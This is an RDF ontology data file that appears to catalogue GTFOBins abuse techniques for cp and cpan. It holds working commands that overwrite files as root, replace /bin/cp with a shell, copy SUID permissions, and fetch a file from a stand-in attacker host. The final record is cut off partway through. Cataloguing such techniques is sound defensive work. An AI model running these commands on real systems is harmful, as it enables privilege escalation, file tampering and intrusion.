mknd:command_cp-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cp-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
        "This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action." ;
    d3f:uses mknd:executable_cp ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cp ;
    mknd:provides mknd:function_sudo ;
    mknd:value """LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
sudo cp $TF $LFILE
""",
        """LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
""",
        """sudo cp /bin/sh /bin/cp
sudo cp
""" .

mknd:command_cp-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cp-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
        "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another." ;
    d3f:uses mknd:executable_cp ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cp ;
    mknd:provides mknd:function_suid ;
    mknd:value """LFILE=file_to_change
./cp --attributes-only --preserve=all ./cp "$LFILE"
""",
        """LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
./cp $TF $LFILE
""",
        """LFILE=file_to_write
echo "DATA" | ./cp /dev/stdin "$LFILE"
""" .

mknd:command_cpan-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpan-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via an HTTP GET request and store it in `PWD`." ;
    d3f:uses mknd:executable_cpan ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpan ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
""" .

mknd:command_cpan-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "cpan-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`." ;
    d3f:uses mknd:executable_cpan ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_cpan ;
    mknd:provides mknd:function_file-upload ;
